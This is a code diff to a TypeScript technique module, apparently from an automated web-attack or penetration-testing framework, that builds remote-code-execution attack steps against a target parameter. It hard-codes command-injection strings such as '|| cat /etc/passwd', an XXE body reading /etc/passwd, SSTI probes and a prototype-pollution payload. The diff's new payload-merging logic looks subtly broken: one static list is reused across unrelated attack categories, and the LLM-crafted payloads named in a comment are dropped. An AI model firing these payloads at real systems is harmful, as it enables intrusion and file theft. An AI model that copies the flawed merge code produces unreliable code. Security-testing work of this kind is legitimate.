@@ -21,9 +21,8 @@ import type {
   StepExecutionResult,
   PrimitiveResult,
 } from './framework'
-import { claimFor } from './framework'
+import { claimFor, loadPayloads } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
-import { getPayloadStore } from '../payloads/store'
 
 /** Pick the parameter name to inject into. */
 function paramName(ctx: TechniqueContext, method: string): string {
@@ -46,18 +45,26 @@ export const rceClass: TechniquePrimitive = {
     if (method === 'GET') return hasParamField || true
     return true
   },
-  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
+   async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
     const baseUrl = ctx.endpoint?.url ?? ctx.target!
     const method = (ctx.endpoint?.method ?? 'GET').toUpperCase()
     const param = paramName(ctx, method)
     const sessionHeaders = ctx.sessionHeaders ?? {}
     const sep = baseUrl.includes('?') ? '&' : '?'
+
+    // Load and merge payloads (static from PayloadStore + LLM-crafted)
+    const payloadResult = loadPayloads(ctx)
+    const allPayloads = payloadResult.bySource.static.length > 0
+      ? payloadResult.bySource.static
+      : []
+
+    const sstiPayloads = allPayloads.length > 0 ? allPayloads : ['${{7*7}}', "{{7*'7'}}", '<%= 7*7 %>']
+    const cmdPayloads = allPayloads.length > 3 ? allPayloads.slice(0, 4) : ['; id', '| whoami', '$(id)', '|| cat /etc/passwd']
+    const xxeBody = allPayloads.length > 4 ? allPayloads[4] : '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
+    const protoBody = allPayloads.length > 5 ? allPayloads[5] : JSON.stringify({ __proto__: { polluted: 'yes' } })
     const steps: AttackStep[] = []
 
-    const sstiPayloads = getPayloadStore().getPayloads('ssti/generic') || ['${{7*7}}', "{{7*'7'}}", '<%= 7*7 %>']
-    const cmdPayloads = getPayloadStore().getPayloads('command-injection/unix', 'unix') || ['; id', '| whoami', '$(id)', '|| cat /etc/passwd']
-    const xxeBody = (getPayloadStore().getPayloads('xxe/oob') || ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'])[0]
-    const protoBody = (getPayloadStore().getPayloads('prototype-pollution/client') || [JSON.stringify({ __proto__: { polluted: 'yes' } })])[0]
+    // SSTI (server-side template injection) payloads.
 
     // 1. SSTI — template-injection probes via the target param.
     for (const p of sstiPayloads) {
